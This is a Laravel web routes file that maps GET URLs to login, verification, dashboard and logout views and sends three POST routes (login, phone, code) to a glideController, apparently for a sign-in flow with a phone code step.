<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\glideController;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

// Route::get('/', function () {
//     return view('welcome');
// });

Route::get('/tt', function () {
    return view('table');
})->name('start');

Route::get('/', function () {
    return view('login');
})->name('start');


Route::get('send', function () {
    return view('send');
});

Route::get('verify', function () {
    return view('verify');
});

Route::get('home', function () {
    return view('dashboard');
});

Route::get('logout', function () {
    return view('logout');
})->name('logout');


Route::post('postlogin', [glideController::class, 'login'])->name('postlogin');
Route::post('postphone', [glideController::class, 'phone'])->name('postphone');
Route::post('postcode', [glideController::class, 'code'])->name('postcode');
